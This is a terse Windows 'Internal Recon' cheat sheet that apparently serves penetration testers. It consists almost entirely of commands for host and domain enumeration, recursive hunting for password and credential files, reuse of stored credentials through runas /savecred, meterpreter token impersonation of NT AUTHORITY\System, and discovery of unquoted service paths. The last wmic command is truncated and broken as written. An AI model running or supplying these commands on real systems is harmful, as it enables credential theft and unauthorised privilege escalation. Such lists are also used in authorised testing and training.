# Internal Recon

## General

### System info

```cpp
systeminfo
hostname
whoami /all
```

### Users/localgroups on the machine

```cpp
net users
net localgroups
net localgroups Administrators
net user hax0r

#Check local and domain
net user hax0r /domain
net group Administrators /domain
```

### Network information/connections

```cpp
ipconfig /all
route print
arp -A
netstat -ano
```

### Search tips

```csharp
#FindStr
findstr /spin "password" *.* //Recursive string scan

#Dir
dir /a-r-d /s /b //Search for writeable directories
dir secret.txt /s /p //Search for secret.txt recursive from folder
dir /s *pass* == *cred* == *vnc* == *.config* //Search for certain words
```

## Privilege Escalation

### Stored Credential

```csharp
cmdkey /list //Check if any stored key
runas /user:administrator /savecred "cmd.exe /k whoami" //Using them
```

### Impersonating Tokens with meterpreter

```csharp
use incognito
list_tokens -u
impersonate_token NT-AUTHORITY\System
```

### Unquoted Path

```cpp
#Obtain the path of the executable called by a Windows service
sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul

#Default search
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v
```

